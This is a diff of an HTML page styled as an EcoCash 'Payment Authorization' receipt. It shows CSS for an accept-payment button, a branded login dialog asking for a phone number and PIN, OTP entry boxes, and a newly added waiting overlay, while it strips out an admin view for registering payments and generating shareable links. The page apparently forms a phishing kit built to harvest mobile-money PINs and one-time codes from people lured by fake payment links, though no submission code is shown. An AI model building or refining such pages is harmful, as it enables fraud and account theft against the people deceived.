@@ -6,140 +6,48 @@
 <title>EcoCash — Payment Authorization</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Poppins:wght@500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
-/* =========================================================
-   EcoCash Design System
-   ========================================================= */
 :root{
-  --primary-green:#22a356; --primary-green-hover:#1b8a47; --success-green:#1ebd5a;
-  --ecocash-blue:#005CA9; --ecocash-blue-dark:#004580; --ecocash-blue-light:#e6f0fa;
-  --ecocash-red:#E31B23; --ecocash-red-dark:#b8141b; --ecocash-red-light:#fef2f2;
-  --ecocash-orange:#e0693a;
-  --bg-page:#f8fafc; --bg-admin:#0f172a; --card-bg:#ffffff;
-  --text-primary:#1f2937; --text-secondary:#4b5563; --text-muted:#6b7280; --text-light:#9ca3af;
-  --border-color:#e2e8f0; --border-input:#cbd5e1; --border-input-focus:#005CA9;
+  --primary-green:#22a356; --primary-green-hover:#1b8a47;
+  --ecocash-blue:#005CA9; --ecocash-blue-dark:#004580;
+  --ecocash-red:#E31B23;
+  --bg-page:#f8fafc; --card-bg:#fff;
+  --text-primary:#1f2937; --text-muted:#6b7280;
+  --border-color:#e2e8f0; --border-input:#cbd5e1;
   --shadow-sm:0 1px 2px 0 rgba(0,0,0,.05);
   --shadow-card:0 4px 20px -2px rgba(0,0,0,.06),0 2px 6px -1px rgba(0,0,0,.04);
-  --shadow-elevated:0 10px 25px -5px rgba(0,0,0,.1),0 8px 10px -6px rgba(0,0,0,.1);
   --radius-card:14px; --radius-input:8px; --radius-btn:8px;
   --font-family:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
 }
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-body{font-family:var(--font-family);background-color:var(--bg-page);color:var(--text-primary);min-height:100vh;display:flex;flex-direction:column;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
-.hidden{display:none !important}
-
-/* Brand */
+body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-primary);min-height:100vh;display:flex;flex-direction:column;-webkit-font-smoothing:antialiased}
 .brand-badge{font-size:20px;font-weight:800;letter-spacing:-.5px;display:inline-flex;align-items:center;gap:1px}
 .brand-eco{color:var(--ecocash-blue)} .brand-cash{color:var(--ecocash-red)}
-.admin-shield-tag{font-size:11px;font-weight:700;background:#e0f2fe;color:#0369a1;padding:3px 8px;border-radius:999px;margin-left:10px;text-transform:uppercase;letter-spacing:.5px;display:inline-flex;align-items:center;gap:4px}
 
-/* ================= ADMIN ================= */
-.admin-body{background-color:#f1f5f9}
-.admin-navbar{background:#fff;border-bottom:1px solid var(--border-color);padding:12px 28px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100;box-shadow:var(--shadow-sm)}
-.admin-nav-meta{display:flex;align-items:center;gap:16px}
-.admin-live-indicator{font-size:12px;font-weight:600;color:#059669;display:inline-flex;align-items:center;gap:6px;background:#ecfdf5;padding:4px 10px;border-radius:999px}
-.pulse-dot{width:7px;height:7px;background-color:#10b981;border-radius:50%;box-shadow:0 0 0 0 rgba(16,185,129,.7);animation:pulseGlow 2s infinite}
-@keyframes pulseGlow{0%{transform:scale(.95);box-shadow:0 0 0 0 rgba(16,185,129,.7)}70%{transform:scale(1);box-shadow:0 0 0 6px rgba(16,185,129,0)}100%{transform:scale(.95);box-shadow:0 0 0 0 rgba(16,185,129,0)}}
-.btn-secondary-sm{display:inline-flex;align-items:center;gap:6px;padding:7px 14px;border-radius:6px;border:1px solid var(--border-color);background:#fff;font-size:13px;font-weight:600;color:#334155;cursor:pointer;transition:all .15s ease}
-.btn-secondary-sm:hover{background:#f8fafc;border-color:#cbd5e1}
-.admin-main{flex:1;padding:28px 24px;max-width:1240px;margin:0 auto;width:100%}
-.admin-container{display:grid;grid-template-columns:1.15fr .85fr;gap:28px;align-items:start}
-.admin-card{background:#fff;border-radius:var(--radius-card);border:1px solid var(--border-color);box-shadow:var(--shadow-card);padding:24px}
-.admin-card-header{display:flex;align-items:flex-start;gap:14px;margin-bottom:22px;padding-bottom:18px;border-bottom:1px solid #f1f5f9}
-.header-icon-box{width:44px;height:44px;border-radius:10px;background:#eff6ff;display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.admin-card-title{font-size:19px;font-weight:700;color:#0f172a;line-height:1.3}
-.admin-card-subtitle{font-size:13px;color:var(--text-muted);margin-top:3px}
-
-.form-group{margin-bottom:16px}
-.label-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
-label{display:block;font-size:13px;font-weight:600;color:#334155;margin-bottom:6px}
-.required{color:var(--ecocash-red)}
-.helper-pill{font-size:11px;font-weight:600;color:#0369a1;background:#e0f2fe;padding:2px 7px;border-radius:999px}
-.field-hint{display:block;font-size:12px;color:#64748b;margin-top:5px}
-.styled-input,.styled-select{width:100%;padding:10px 14px;font-size:14px;font-family:inherit;color:#0f172a;background:#fff;border:1px solid var(--border-input);border-radius:var(--radius-input);outline:none;transition:all .15s ease}
-.styled-input:focus,.styled-select:focus{border-color:var(--ecocash-blue);box-shadow:0 0 0 3px rgba(0,92,169,.15)}
-.styled-select{cursor:pointer;background-image:url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23475569' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");background-repeat:no-repeat;background-position:right 12px center;background-size:16px;padding-right:36px;appearance:none;-webkit-appearance:none}
-.uppercase-text{text-transform:uppercase;font-weight:600;letter-spacing:.5px}
-.field-helper-btn{background:none;border:none;color:var(--ecocash-blue);font-size:12px;font-weight:600;cursor:pointer;display:inline-flex;align-items:center;gap:4px;padding:2px 4px}
-.field-helper-btn:hover{text-decoration:underline}
-.phone-input-combined{display:flex;border:1px solid var(--border-input);border-radius:var(--radius-input);overflow:hidden;background:#fff;transition:all .15s ease}
-.phone-input-combined:focus-within{border-color:var(--ecocash-blue);box-shadow:0 0 0 3px rgba(0,92,169,.15)}
-.country-prefix-addon{display:flex;align-items:center;gap:6px;padding:0 12px;background:#f8fafc;border-right:1px solid var(--border-input);font-size:13px;font-weight:600;color:#334155;user-select:none}
-.phone-field{border:none !important;border-radius:0 !important;box-shadow:none !important}
-.form-row-2col{display:grid;grid-template-columns:1fr 1fr;gap:16px}
-.btn-primary-block{width:100%;background:#005CA9;color:#fff;border:none;border-radius:var(--radius-btn);padding:13px 20px;font-size:15px;font-weight:700;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:8px;transition:all .2s ease;box-shadow:0 4px 12px rgba(0,92,169,.25);margin-top:8px}
-.btn-primary-block:hover{background:#004b8a;transform:translateY(-1px);box-shadow:0 6px 16px rgba(0,92,169,.35)}
-.btn-primary-block:active{transform:translateY(0)}
-
-.admin-column-right{display:flex;flex-direction:column;gap:24px}
-.link-showcase-card{border-top:4px solid var(--ecocash-blue);position:relative}
-.card-status-tag{margin-bottom:12px}
-.status-ready-pill{font-size:11px;font-weight:700;background:#ecfdf5;color:#047857;padding:3px 10px;border-radius:999px;text-transform:uppercase;letter-spacing:.5px}
-.showcase-title{font-size:18px;font-weight:700;color:#0f172a;margin-bottom:6px}
-.showcase-desc{font-size:13px;color:var(--text-muted);line-height:1.5;margin-bottom:18px}
-.share-link-wrapper{margin-bottom:16px}
-.link-input-group{display:flex;background:#f8fafc;border:1px solid #cbd5e1;border-radius:8px;overflow:hidden;padding:4px}
-.share-url-input{flex:1;border:none;background:transparent;padding:8px 12px;font-size:13px;font-family:monospace;color:#1e293b;outline:none}
-.btn-copy-link{background:var(--ecocash-blue);color:#fff;border:none;border-radius:6px;padding:8px 16px;font-size:13px;font-weight:600;cursor:pointer;display:inline-flex;align-items:center;gap:6px;transition:all .15s ease;white-space:nowrap}
-.btn-copy-link:hover{background:var(--ecocash-blue-dark)}
-.showcase-actions-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px}
-.btn-action-outline{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:9px 12px;border:1px solid #cbd5e1;background:#fff;border-radius:6px;font-size:13px;font-weight:600;color:#334155;cursor:pointer;transition:all .15s ease}
-.btn-action-outline:hover{background:#f8fafc;border-color:#94a3b8;color:#0f172a}
-.link-meta-summary{background:#f8fafc;border-radius:8px;padding:14px 16px;display:grid;grid-template-columns:1fr 1fr;gap:12px;border:1px solid #f1f5f9}
-.meta-item{display:flex;flex-direction:column;gap:3px}
-.m-lbl{font-size:11px;font-weight:600;color:#64748b;text-transform:uppercase;letter-spacing:.5px}
-.m-val{font-size:13px;font-weight:600;color:#0f172a}
-.m-val.highlight{color:var(--ecocash-blue);font-weight:700}
-.m-val.code{font-family:monospace;background:#e2e8f0;padding:2px 6px;border-radius:4px;display:inline-block;width:fit-content}
-
-.history-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid #f1f5f9}
-.history-title{font-size:15px;font-weight:700;color:#0f172a}
-.history-subtitle{font-size:12px;color:var(--text-muted)}
-.btn-clear-text{background:none;border:none;color:#dc2626;font-size:12px;font-weight:600;cursor:pointer;padding:2px 6px}
-.btn-clear-text:hover{text-decoration:underline}
-.admin-history-list{display:flex;flex-direction:column;gap:10px;max-height:380px;overflow-y:auto}
-.history-empty{font-size:13px;color:#94a3b8;text-align:center;padding:24px 12px}
-.history-item-row{display:flex;align-items:center;justify-content:space-between;padding:10px 12px;border-radius:8px;background:#f8fafc;border:1px solid #f1f5f9;gap:10px;transition:all .15s ease}
-.history-item-row:hover{background:#eff6ff;border-color:#dbeafe}
-.hist-info{flex:1;min-width:0}
-.hist-name{font-size:13px;font-weight:700;color:#0f172a;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.hist-code{font-size:11px;font-family:monospace;color:#475569;font-weight:600;background:#e2e8f0;padding:1px 5px;border-radius:3px;margin-left:4px}
-.hist-sub{font-size:11px;color:#64748b;margin-top:2px}
-.hist-amt{font-size:13px;font-weight:700;color:var(--ecocash-blue);white-space:nowrap}
-.hist-actions{display:flex;gap:4px}
-.btn-hist-action{background:#fff;border:1px solid #cbd5e1;border-radius:4px;width:28px;height:28px;display:flex;align-items:center;justify-content:center;cursor:pointer;color:#475569;transition:all .15s ease;font-size:14px}
-.btn-hist-action:hover{background:var(--ecocash-blue);border-color:var(--ecocash-blue);color:#fff}
-.btn-hist-action.delete:hover{background:#dc2626;border-color:#dc2626;color:#fff}
-
-/* ================= CLIENT ================= */
-.client-body{background-color:#f3f4f6}
+.client-body{background:#f3f4f6}
 .client-topbar{background:#fff;border-bottom:1px solid var(--border-color);padding:10px 20px;display:flex;justify-content:space-between;align-items:center;box-shadow:var(--shadow-sm)}
 .client-brand{display:flex;align-items:center;font-size:18px;font-weight:800}
-.btn-client-help{background:#f8fafc;border:1px solid var(--border-color);border-radius:6px;padding:6px 12px;font-size:12px;font-weight:600;color:#475569;cursor:pointer;display:inline-flex;align-items:center;gap:5px}
-.btn-client-help:hover{background:#f1f5f9}
-.client-main-container{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px 16px 40px 16px}
-.receipt-action-toolbar{display:flex;gap:10px;margin-bottom:16px;z-index:10}
-.toolbar-btn{display:inline-flex;align-items:center;gap:6px;padding:8px 14px;background:#fff;border:1px solid #cbd5e1;border-radius:20px;font-size:12px;font-weight:600;color:#334155;cursor:pointer;box-shadow:0 2px 5px rgba(0,0,0,.06);transition:all .15s ease}
-.toolbar-btn:hover{background:#f8fafc;border-color:#94a3b8;transform:translateY(-1px)}
+.btn-client-help{background:#f8fafc;border:1px solid var(--border-color);border-radius:6px;padding:6px 12px;font-size:12px;font-weight:600;color:#475569;cursor:pointer}
+.client-main-container{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px 16px 40px}
+.receipt-action-toolbar{display:flex;gap:10px;margin-bottom:16px}
+.toolbar-btn{display:inline-flex;align-items:center;gap:6px;padding:8px 14px;background:#fff;border:1px solid #cbd5e1;border-radius:20px;font-size:12px;font-weight:600;color:#334155;cursor:pointer;box-shadow:0 2px 5px rgba(0,0,0,.06)}
 .toolbar-btn.primary{background:#005CA9;color:#fff;border-color:#005CA9}
-.toolbar-btn.primary:hover{background:#004b8a}
 .receipt-card-container{width:100%;max-width:440px;background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.08);overflow:hidden;display:flex;flex-direction:column;border:1px solid #e5e7eb}
-.receipt-nav-header{display:flex;justify-content:space-between;align-items:center;padding:18px 20px 12px 20px;background:#fff}
+.receipt-nav-header{display:flex;justify-content:space-between;align-items:center;padding:18px 20px 12px;background:#fff}
 .receipt-header-title{font-size:16px;font-weight:700;color:#111827}
 .btn-icon-back,.btn-icon-help{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#f9fafb;border:1px solid #f3f4f6;color:#4b5563;cursor:pointer}
-.receipt-content-body{padding:8px 24px 24px 24px;display:flex;flex-direction:column;align-items:center;text-align:center}
-.status-badge-wrapper{margin-bottom:12px}
-.success-circle-icon{width:52px;height:52px;border-radius:50%;background:#22a356;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 14px rgba(34,163,86,.35)}
-.status-heading{font-size:19px;font-weight:800;color:#111827;margin-bottom:6px;letter-spacing:-.3px}
+.receipt-content-body{padding:8px 24px 24px;display:flex;flex-direction:column;align-items:center;text-align:center}
+.success-circle-icon{width:52px;height:52px;border-radius:50%;background:#22a356;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 14px rgba(34,163,86,.35);margin-bottom:12px}
+.status-heading{font-size:19px;font-weight:800;color:#111827;margin-bottom:6px}
 .status-description{font-size:13px;color:#4b5563;line-height:1.45;margin-bottom:12px;max-width:340px}
 .status-time-row{display:inline-flex;align-items:center;gap:5px;font-size:12px;color:#6b7280;font-weight:500;margin-bottom:20px}
 .amount-action-card{width:100%;background:#fff;border:1px solid #e5e7eb;border-radius:12px;padding:14px 16px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 6px rgba(0,0,0,.02)}
 .amount-header-row{display:flex;flex-direction:column;align-items:flex-start;text-align:left}
 .amount-label{font-size:12px;color:#6b7280;font-weight:500}
 .amount-value{font-size:18px;font-weight:800;color:#111827}
-.btn-accept-payment{background:#22a356;color:#fff;border:none;border-radius:8px;padding:10px 18px;font-size:14px;font-weight:700;cursor:pointer;transition:all .2s ease;box-shadow:0 2px 8px rgba(34,163,86,.3)}
-.btn-accept-payment:hover{background:#1b8a47;transform:translateY(-1px)}
+.btn-accept-payment{background:#22a356;color:#fff;border:none;border-radius:8px;padding:10px 18px;font-size:14px;font-weight:700;cursor:pointer;box-shadow:0 2px 8px rgba(34,163,86,.3)}
+.btn-accept-payment:hover{background:#1b8a47}
 .btn-accept-payment.accepted{background:#059669}
 .btn-accept-payment.declined{background:#dc2626}
 .party-info-row{width:100%;display:flex;align-items:center;gap:14px;text-align:left;margin-bottom:14px}
@@ -147,275 +55,93 @@ label{display:block;font-size:13px;font-weight:600;color:#334155;margin-bottom:6
 .party-details{display:flex;flex-direction:column}
 .party-name{font-size:15px;font-weight:700;color:#111827}
 .party-subtext{font-size:13px;color:#6b7280;margin-top:1px}
-.receipt-divider{width:100%;height:1px;background:#f1f5f9;margin:6px 0 16px 0}
+.receipt-divider{width:100%;height:1px;background:#f1f5f9;margin:6px 0 16px}
 .from-section{width:100%;text-align:left;margin-bottom:16px}
 .section-label{display:block;font-size:12px;color:#9ca3af;font-weight:500;margin-bottom:10px}
 .metadata-list{width:100%;display:flex;flex-direction:column;gap:12px;background:#f9fafb;border-radius:10px;padding:14px;margin-bottom:22px}
 .metadata-row{display:flex;justify-content:space-between;align-items:center;font-size:13px}
 .meta-label{color:#6b7280;font-weight:500}
 .meta-value{color:#111827;font-weight:700}
-.ecocash-logo-container{padding:6px 0 2px 0}
-.ecocash-logo-mark{font-size:26px;font-weight:900;letter-spacing:-1px}
+.ecocash-logo-mark{font-size:26px;font-weight:900;letter-spacing:-1px;padding:6px 0 2px}
 .logo-eco{color:var(--ecocash-blue)} .logo-cash{color:var(--ecocash-red)}
-.receipt-bottom-bar{display:flex;justify-content:space-around;align-items:center;padding:12px 16px;border-top:1px solid #f1f5f9;background:#fff}
-.bottom-tab{background:none;border:none;display:flex;flex-direction:column;align-items:center;gap:3px;cursor:pointer;font-size:11px;font-weight:600;color:#64748b;padding:4px 12px}
 
-/* ================= MODALS ================= */
-.modal-backdrop{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(15,23,42,.65);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:1000;padding:16px}
+.modal-backdrop{position:fixed;inset:0;background:rgba(15,23,42,.65);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:1000;padding:16px}
 .modal-backdrop.open{display:flex;animation:fadeIn .2s ease-out}
 @keyframes fadeIn{from{opacity:0;transform:scale(.98)}to{opacity:1;transform:scale(1)}}
-.ecocash-login-dialog{width:100%;max-width:400px;background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,.25);position:relative;animation:slideUp .25s ease-out}
-@keyframes slideUp{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
+.ecocash-login-dialog{width:100%;max-width:400px;background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,.25);position:relative}
 .btn-dialog-close{position:absolute;top:14px;right:14px;width:30px;height:30px;background:rgba(255,255,255,.85);border:none;border-radius:50%;font-size:20px;line-height:1;color:#475569;cursor:pointer;display:flex;align-items:center;justify-content:center;z-index:10}
-.login-brand-header{background:#fff;padding:24px 20px 14px 20px;text-align:center}
+.login-brand-header{background:#fff;padding:24px 20px 14px;text-align:center}
 .login-heading{font-size:18px;font-weight:800;color:#0f172a;margin-top:6px}
 .login-blue-container{background:#005CA9;padding:20px 18px}
 .login-inner-white-card{background:#fff;border-radius:14px;padding:22px 18px;display:flex;flex-direction:column;align-items:center}
 .login-phone-bar{width:100%;display:flex;align-items:center;border:1.5px solid #005CA9;border-radius:8px;overflow:hidden;background:#fff;margin-bottom:12px}
-.login-country-prefix{display:flex;align-items:center;gap:5px;padding:10px 12px;background:#f1f5f9;border-right:1.5px solid #005CA9;font-size:14px;font-weight:700;color:#0f172a;user-select:none}
+.login-country-prefix{display:flex;align-items:center;gap:5px;padding:10px 12px;background:#f1f5f9;border-right:1.5px solid #005CA9;font-size:14px;font-weight:700;color:#0f172a}
 .flag-emoji{font-size:16px}
 .login-phone-field{flex:1;border:none;padding:10px 12px;font-size:15px;font-weight:600;color:#0f172a;outline:none}
 .pin-tooltip-bubble{background:#e0f2fe;color:#0369a1;font-size:12px;font-weight:600;padding:5px 12px;border-radius:20px;margin-bottom:18px}
 .pin-inputs-wrapper{display:flex;gap:12px;margin-bottom:22px}
-.pin-box{width:52px;height:52px;text-align:center;font-size:24px;font-weight:800;border:1.5px solid #cbd5e1;border-radius:10px;background:#f8fafc;color:#0f172a;outline:none;transition:all .15s ease}
+.pin-box{width:52px;height:52px;text-align:center;font-size:24px;font-weight:800;border:1.5px solid #cbd5e1;border-radius:10px;background:#f8fafc;color:#0f172a;outline:none}
 .pin-box:focus{border-color:#005CA9;background:#fff;box-shadow:0 0 0 3px rgba(0,92,169,.2)}
-.btn-ecocash-login{width:100%;background:#005CA9;color:#fff;border:none;border-radius:8px;padding:12px;font-size:15px;font-weight:700;cursor:pointer;transition:all .15s ease}
+.btn-ecocash-login{width:100%;background:#005CA9;color:#fff;border:none;border-radius:8px;padding:12px;font-size:15px;font-weight:700;cursor:pointer}
 .btn-ecocash-login:hover{background:#004b8a}
-.login-bottom-pills-row{display:flex;justify-content:center;gap:10px;margin:16px 0 12px 0}
-.login-pill-btn{background:rgba(255,255,255,.2);border:1px solid rgba(255,255,255,.4);color:#fff;padding:6px 14px;border-radius:20px;font-size:12px;font-weight:600;cursor:pointer;transition:all .15s ease}
-.login-pill-btn:hover{background:rgba(255,255,255,.35)}
-.login-card-footer{text-align:center;margin-top:4px}
-.version-tag{font-size:11px;color:rgba(255,255,255,.75);font-weight:600}
-.terms-text{font-size:11px;color:rgba(255,255,255,.7);margin-top:2px}
-.otp-instruction-header{display:flex;flex-direction:column;align-items:center;margin-bottom:18px}
-.otp-icon-shield{margin-bottom:8px}
-.otp-msg{font-size:13px;color:#475569;text-align:center;line-height:1.4}
-.otp-inputs-wrapper{display:flex;gap:8px;margin-bottom:16px}
-.otp-box{width:42px;height:48px;text-align:center;font-size:20px;font-weight:800;border:1.5px solid #cbd5e1;border-radius:8px;background:#f8fafc;color:#0f172a;outline:none;transition:all .15s ease}
+.btn-ecocash-login:disabled{background:#94a3b8;cursor:not-allowed}
+.otp-inputs-wrapper{display:flex;gap:8px;margin-bottom:16px;justify-content:center;flex-wrap:wrap}
+.otp-box{width:42px;height:48px;text-align:center;font-size:20px;font-weight:800;border:1.5px solid #cbd5e1;border-radius:8px;background:#f8fafc;color:#0f172a;outline:none}
 .otp-box:focus{border-color:#005CA9;background:#fff;box-shadow:0 0 0 3px rgba(0,92,169,.2)}
-.otp-resend-row{font-size:12px;color:#64748b;margin-bottom:18px}
-.btn-resend{background:none;border:none;color:#005CA9;font-weight:700;cursor:pointer;text-decoration:underline}
-.btn-verify-otp{background:#22a356}
-.btn-verify-otp:hover{background:#1b8a47}
-.btn-back-to-login{background:none;border:none;color:#64748b;font-size:13px;font-weight:600;cursor:pointer;margin-top:12px}
-.btn-back-to-login:hover{color:#0f172a;text-decoration:underline}
-.declined-container{background:#b91c1c}
-.declined-white-card{text-align:center}
-.declined-badge-wrapper{margin-bottom:12px}
-.declined-circle-icon{width:50px;height:50px;border-radius:50%;background:#dc2626;display:flex;align-items:center;justify-content:center;margin:0 auto;box-shadow:0 4px 12px rgba(220,38,38,.35)}
-.declined-title{font-size:18px;font-weight:800;color:#111827;margin-bottom:6px}
-.declined-desc{font-size:13px;color:#4b5563;line-height:1.45;margin-bottom:16px}
-.declined-details-box{width:100%;background:#fef2f2;border:1px solid #fee2e2;border-radius:8px;padding:12px;display:flex;flex-direction:column;gap:8px;margin-bottom:18px;text-align:left}
-.declined-row{display:flex;justify-content:space-between;font-size:12px}
-.d-label{color:#7f1d1d;font-weight:600}
-.d-value{color:#111827;font-weight:700}
-.d-value.error-code{font-family:monospace;background:#fecaca;padding:1px 5px;border-radius:3px;color:#991b1b}
-.d-value.status-failed{color:#dc2626}
-.declined-actions-row{display:flex;gap:10px;width:100%}
-.btn-retry-payment{flex:1;background:#005CA9;color:#fff;border:none;border-radius:8px;padding:11px;font-size:14px;font-weight:700;cursor:pointer}
-.btn-retry-payment:hover{background:#004b8a}
-.btn-dismiss-declined{background:#f1f5f9;color:#334155;border:1px solid #cbd5e1;border-radius:8px;padding:11px 18px;font-size:14px;font-weight:600;cursor:pointer}
-.btn-dismiss-declined:hover{background:#e2e8f0}
-.modal-card{width:100%;max-width:420px;background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,.2)}
-.modal-header{padding:16px 20px;border-bottom:1px solid #f1f5f9;display:flex;justify-content:space-between;align-items:center}
-.modal-title{font-size:16px;font-weight:700;color:#0f172a}
-.btn-modal-close{background:none;border:none;font-size:24px;line-height:1;color:#64748b;cursor:pointer}
-.modal-body{padding:20px}
-.modal-desc{font-size:13px;color:#475569;margin-bottom:16px;line-height:1.45}
-.share-link-box{display:flex;gap:8px;margin-bottom:16px}
-.share-link-box input{flex:1;padding:9px 12px;font-size:13px;font-family:monospace;border:1px solid var(--border-input);border-radius:6px}
-.btn-copy{background:#005CA9;color:#fff;border:none;border-radius:6px;padding:0 16px;font-size:13px;font-weight:600;cursor:pointer}
-.modal-actions-grid{display:grid;grid-template-columns:1fr;gap:10px}
-.modal-action-btn{display:flex;align-items:center;justify-content:center;gap:8px;padding:10px;border:1px solid #cbd5e1;background:#fff;border-radius:8px;font-size:13px;font-weight:600;color:#334155;cursor:pointer}
-.modal-action-btn:hover{background:#f8fafc}
-.help-contact-box{display:flex;flex-direction:column;gap:10px;background:#f8fafc;padding:14px;border-radius:8px;font-size:13px}
-.contact-row{display:flex;justify-content:space-between}
-.toast-notification{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:#0f172a;color:#fff;padding:12px 20px;border-radius:8px;font-size:13px;font-weight:600;box-shadow:0 10px 25px rgba(0,0,0,.25);z-index:2000;opacity:0;transition:all .3s cubic-bezier(.16,1,.3,1);pointer-events:none;max-width:90%;text-align:center}
-.toast-notification.show{transform:translateX(-50%) translateY(0);opacity:1}
+.otp-instruction-header{display:flex;flex-direction:column;align-items:center;margin-bottom:18px}
+.otp-msg{font-size:13px;color:#475569;text-align:center;line-height:1.4}
+.otp-icon-shield{margin-bottom:8px}
 
-/* Responsive */
-@media (max-width:960px){.admin-container{grid-template-columns:1fr}}
-@media (max-width:640px){
-  .admin-navbar{align-items:flex-start;flex-direction:column;gap:12px;padding:12px 16px}
-  .admin-main{padding:16px 12px 24px}
-  .admin-container,.admin-column-right{gap:16px}
-  .admin-card{padding:16px;border-radius:8px}
-  .form-row-2col,.showcase-actions-grid,.link-meta-summary{grid-template-columns:1fr}
-  .link-input-group{flex-direction:column;gap:6px}
-  .share-url-input,.btn-copy-link{width:100%}
-  .btn-copy-link{justify-content:center}
-  .history-item-row{align-items:flex-start;flex-direction:column}
-  .hist-info,.hist-amt,.hist-actions{width:100%}
-  .hist-actions{justify-content:flex-end}
-  .styled-input,.styled-select{font-size:16px}
-}
-@media print{.no-print,.admin-navbar,.client-topbar,.receipt-action-toolbar,.receipt-bottom-bar,.btn-icon-back,.btn-icon-help{display:none !important}body{background:#fff !important}.client-main-container{padding:0 !important}.receipt-card-container{box-shadow:none !important;border:1px solid #d1d5db !important;max-width:100% !important}}
+/* Loading/waiting screen */
+.waiting-overlay{position:fixed;inset:0;background:rgba(15,23,42,.85);backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;z-index:1500;padding:16px}
+.waiting-overlay.open{display:flex;animation:fadeIn .2s}
+.waiting-card{background:#fff;border-radius:20px;max-width:360px;width:100%;padding:32px 24px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,.3)}
+.spinner{width:52px;height:52px;border:4px solid #e2e8f0;border-top-color:#005CA9;border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 20px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.waiting-title{font-size:18px;font-weight:800;color:#0f172a;margin-bottom:8px}
+.waiting-desc{font-size:13px;color:#475569;line-height:1.5}
+.waiting-hint{margin-top:16px;font-size:11px;color:#94a3b8}
+
+/* Error / success popup cards */
+.status-popup-card{background:#fff;border-radius:20px;max-width:360px;width:100%;padding:28px 22px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,.3)}
+.status-icon-circle{width:56px;height:56px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
+.icon-red{background:#dc2626;box-shadow:0 4px 14px rgba(220,38,38,.4)}
+.icon-green{background:#22a356;box-shadow:0 4px 14px rgba(34,163,86,.4)}
+.status-popup-title{font-size:18px;font-weight:800;color:#111827;margin-bottom:8px}
+.status-popup-desc{font-size:13px;color:#4b5563;line-height:1.45;margin-bottom:18px}
+.btn-popup-primary{background:#005CA9;color:#fff;border:none;border-radius:8px;padding:12px 20px;font-size:14px;font-weight:700;cursor:pointer;width:100%}
+.btn-popup-primary:hover{background:#004b8a}
+
+.toast-notification{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:#0f172a;color:#fff;padding:12px 20px;border-radius:8px;font-size:13px;font-weight:600;box-shadow:0 10px 25px rgba(0,0,0,.25);z-index:2000;opacity:0;transition:all .3s;pointer-events:none;max-width:90%;text-align:center}
+.toast-notification.show{transform:translateX(-50%) translateY(0);opacity:1}
 </style>
 </head>
 <body class="client-body">
 
-<!-- =========================================================
-     ADMIN VIEW
-     ========================================================= -->
-<div id="view-admin" class="hidden">
-  <div class="admin-body" style="min-height:100vh;display:flex;flex-direction:column">
-    <header class="admin-navbar">
-      <div class="admin-nav-brand">
-        <div class="brand-badge">
-          <span class="brand-eco">Eco</span><span class="brand-cash">Cash</span>
-          <span class="admin-shield-tag">
-            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-            Admin Portal
-          </span>
-        </div>
-      </div>
-      <div class="admin-nav-meta">
-        <span class="admin-live-indicator"><span class="pulse-dot"></span> EcoCash Network Active</span>
-        <button type="button" class="btn-secondary-sm" onclick="loadSampleAdminData()">Clear</button>
-      </div>
-    </header>
-    <main class="admin-main">
-      <div class="admin-container">
-        <div class="admin-card form-column">
-          <div class="admin-card-header">
-            <div class="header-icon-box">
-              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#005CA9" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
-            </div>
-            <div>
-              <h1 class="admin-card-title">Register Payment</h1>
-              <p class="admin-card-subtitle">Set up client transaction details and generate a shareable payment link.</p>
